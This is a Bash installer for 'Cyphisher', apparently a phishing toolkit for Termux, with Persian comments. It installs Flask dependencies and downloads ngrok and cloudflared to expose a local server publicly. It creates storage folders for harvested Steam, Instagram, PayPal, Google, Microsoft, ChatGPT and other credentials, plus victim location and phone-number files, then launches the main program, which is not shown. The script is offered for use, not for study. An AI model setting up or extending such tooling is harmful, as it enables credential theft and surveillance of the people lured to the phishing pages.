#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux
# ===============================

AUTO_NGROK="${AUTO_NGROK:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
NGROK_DIR="ngrok"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# رفع مشکلات سیستم
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates openssl-tool -y
        update-ca-certificates --fresh 2>/dev/null || true
    fi
    
    # تنظیم DNS
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی
cleanup_old_ngrok() {
    log "🧹 Cleaning up previous installations..."
    
    pkill -f ngrok 2>/dev/null || true
    pkill -f cloudflared 2>/dev/null || true
    sleep 2
    
    rm -rf "$NGROK_DIR" 2>/dev/null || true
    rm -rf "cloud_flare" 2>/dev/null || true
    rm -f "ngrok" "ngrok.zip" "ngrok.tar.gz" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# نصب dependencies
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget unzip openssl-tool -y
    fi
    
    log "✅ Dependencies installed"
}

# ایجاد محیط پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    source "${VENV_DIR}/bin/activate"
    
    pip install --upgrade pip setuptools wheel
    
    # نصب پکیج‌های ضروری
    pip install requests rich pyfiglet flask flask-cors
    
    # ایجاد requirements.txt
    cat > requirements.txt << 'EOF'
requests==2.31.0
rich==13.5.2
pyfiglet==0.8.post1
flask==2.3.3
flask-cors==4.0.0
EOF
    
    pip install -r requirements.txt
    log "✅ Python packages installed"
}

# نصب ngrok
install_ngrok() {
    log "🌐 Installing ngrok..."
    
    mkdir -p "$NGROK_DIR"
    
    # دانلود ngrok
    URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
    OUTPUT_FILE="${NGROK_DIR}/ngrok.tar.gz"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L --progress-bar -o "$OUTPUT_FILE" "$URL" || return 1
    elif command -v wget >/dev/null 2>&1; then
        wget -O "$OUTPUT_FILE" "$URL" || return 1
    else
        return 1
    fi
    
    # Extract
    cd "$NGROK_DIR"
    tar -xzf "ngrok.tar.gz"
    cd ..
    
    # تنظیم دسترسی
    chmod 755 "${NGROK_DIR}/ngrok"
    
    # تست ngrok
    if "${NGROK_DIR}/ngrok" --version >/dev/null 2>&1; then
        log "✅ ngrok installed successfully"
        return 0
    else
        error "❌ ngrok test failed"
        return 1
    fi
}

# نصب cloudflared
install_cloudflared() {
    log "🌐 Installing cloudflared as fallback..."
    
    mkdir -p "cloud_flare"
    
    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    OUTPUT_FILE="cloud_flare/cloudflared"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L --progress-bar -o "$OUTPUT_FILE" "$URL" || return 1
    elif command -v wget >/dev/null 2>&1; then
        wget -O "$OUTPUT_FILE" "$URL" || return 1
    else
        return 1
    fi
    
    chmod 755 "$OUTPUT_FILE"
    log "✅ cloudflared installed"
    return 0
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
        "Pages" "ABOUT" "AI"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    # ایجاد فایل‌های ضروری
    touch "collected_data/all_devices.json"
    touch "phone_data/numbers.txt"
    
    log "✅ Directories created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux..."
    
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is for Termux only"
        exit 1
    fi
    
    fix_system_issues
    cleanup_old_ngrok
    install_dependencies
    setup_python_env
    
    # نصب tunnel services
    if [ "$AUTO_NGROK" = "1" ]; then
        if ! install_ngrok; then
            log "⚠️ Ngrok installation failed"
        fi
    fi
    
    if ! install_cloudflared; then
        log "⚠️ Cloudflared installation failed"
    fi
    
    create_directories
    
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null)"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    log "Ngrok: $([ -f "${NGROK_DIR}/ngrok" ] && echo 'Installed' || echo 'Not available')"
    log "Cloudflared: $([ -f "cloud_flare/cloudflared" ] && echo 'Installed' || echo 'Not available')"
    
    log "🚀 Starting application in 3 seconds..."
    sleep 3
    
    if [ -f "${VENV_DIR}/bin/python" ]; then
        clear
        log "🏁 Launching Cyphisher..."
        export PATH="$(pwd)/${NGROK_DIR}:$(pwd)/cloud_flare:$PATH"
        export PYTHONPATH="$(pwd)"
        exec "${VENV_DIR}/bin/python" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
